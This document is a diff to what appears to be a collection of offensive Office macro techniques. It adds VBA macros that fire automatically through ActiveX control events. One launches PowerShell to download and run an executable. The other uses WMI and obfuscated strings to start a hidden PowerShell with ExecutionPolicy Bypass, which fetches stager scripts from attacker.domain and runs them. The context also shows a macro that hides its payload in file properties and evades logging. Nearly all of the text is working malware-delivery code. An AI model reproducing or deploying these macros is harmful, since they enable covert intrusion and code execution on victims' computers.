@@ -7,7 +7,6 @@
 
 ### Macro leveraging file properties to hide its payload and StdIn to avoid logging 
 ```vbscript
-# Source: https://gist.github.com/anonymous/70939438968194d2b0f4d5d2cc53c45e
 Public Sub PrintDocumentProperties()
     Dim oApp As New Excel.Application
     Dim oWB As Workbook
@@ -41,4 +40,27 @@ With objWshell1.Exec("powershell.exe -nop -windowstyle hidden -Command -")
 End With
       
 End Sub
+```
+### Using ActiveX controls for macro execution
+```vbscript
+Sub InkEdit1_GotFocus()
+Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://trusted.domain/file.exe',‘file.exe');Start-Process ‘file.exe'", vbNormalFocus)
+End Sub
+```
+### Macro leveraging ActiveX controls (for code execution) and WMI Scripting Library 
+```vbscript
+Sub InkEdit1_GotFocus()
+Debugging
+End Sub
+
+Public Function Debugging() As Variant
+    Const HIDDEN_WINDOW = 0
+    strComputer = "."
+    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+    Set objConfig = objStartup.SpawnInstance_
+    objConfig.ShowWindow = HIDDEN_WINDOW
+    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+    objProcess.Create "powe" & "rshell.e" & "xe" & " -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager1.ps1') | iex } else {(new-object Net.WebClient).DownloadString('https://attacker.domain/stager2.ps1') | iex}"
+End Function
 ```
